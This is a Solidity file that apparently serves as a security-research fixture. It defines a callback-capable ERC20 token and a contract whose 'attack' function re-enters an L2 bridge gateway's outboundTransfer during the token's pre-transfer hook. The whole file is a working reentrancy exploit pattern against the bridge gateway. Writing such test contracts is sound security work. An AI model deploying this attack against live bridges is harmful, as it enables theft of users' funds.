// SPDX-License-Identifier: Apache-2.0

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

interface ITokenSenderHook {
    function beforeTokenTransferFrom() external;
}

interface IL2GatewayRouterLike {
    function outboundTransfer(
        address l1Token,
        address to,
        uint256 amount,
        bytes calldata data
    ) external payable returns (bytes memory);
}

/**
 * @dev Local-only research token. It models a legitimate callback-capable token:
 * the sender receives a hook before transferFrom mutates balances.
 */
contract ReentrantReverseToken is ERC20 {
    address public immutable l1Address;

    constructor(address _l1Address) ERC20("Hooked Reverse Token", "HRT") {
        l1Address = _l1Address;
    }

    function mint(address account, uint256 amount) external {
        _mint(account, amount);
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        if (sender.code.length != 0) {
            ITokenSenderHook(sender).beforeTokenTransferFrom();
        }
        return super.transferFrom(sender, recipient, amount);
    }
}

contract ReverseGatewayReentrantHolder is ITokenSenderHook {
    IL2GatewayRouterLike public immutable router;
    ReentrantReverseToken public immutable token;
    address public immutable gateway;
    address public immutable l1Token;

    address private recipient;
    uint256 private nestedAmount;
    bool private hookEnabled;
    bool private entered;

    constructor(
        address _router,
        address _gateway,
        address _token,
        address _l1Token
    ) {
        router = IL2GatewayRouterLike(_router);
        gateway = _gateway;
        token = ReentrantReverseToken(_token);
        l1Token = _l1Token;
    }

    function attack(
        address _recipient,
        uint256 outerAmount,
        uint256 _nestedAmount
    ) external {
        recipient = _recipient;
        nestedAmount = _nestedAmount;
        entered = false;
        hookEnabled = true;

        token.approve(gateway, outerAmount + _nestedAmount);
        router.outboundTransfer(l1Token, _recipient, outerAmount, "");

        hookEnabled = false;
    }

    function beforeTokenTransferFrom() external override {
        require(msg.sender == address(token), "ONLY_TOKEN");
        if (hookEnabled && !entered) {
            entered = true;
            router.outboundTransfer(l1Token, recipient, nestedAmount, "");
        }
    }
}
